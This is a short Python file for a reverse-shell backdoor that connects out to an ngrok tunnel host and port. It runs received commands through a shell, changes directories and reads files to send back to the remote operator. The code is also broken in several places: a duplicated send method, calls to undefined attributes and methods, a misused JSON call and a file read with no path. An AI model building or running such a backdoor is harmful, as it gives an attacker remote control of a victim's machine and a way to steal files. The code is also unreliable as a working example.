import socket
import subprocess
import os
import json
class Back:
    
    def __init__(self) :
        self.receiver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.receiver.connect(("0.tcp.in.ngrok.io",10512))
    
    def execute(self,command):
        return subprocess.check_output(command, shell=True)
    def reliable_send(self,data):
        json_data=json.dump(data)
        self.connection.send(json_data)
    def reliable_send(self):
        json_data=self.connection.recv(1024)
        return json.loads(json_data)
        



    def read_file(self,path):
        with open(path,"rb") as file:
            return file.read()
        
    def change_dir(self,path):
        os.chdir(path)
        return "[+] Changing working directory" + path
    def run(self):
        while True:
            command=self.reliable()
            
            if command[0]=="exit":
                self.receiver.close()
                exit()
            elif command[0]=="download":
                result=self.read_file()
            elif command[0]=="cd" and len(command)>1:
                self.change_dir(command[1])
            else:
                result = self.execute(command)
                self.receiver.send(result)
            
                


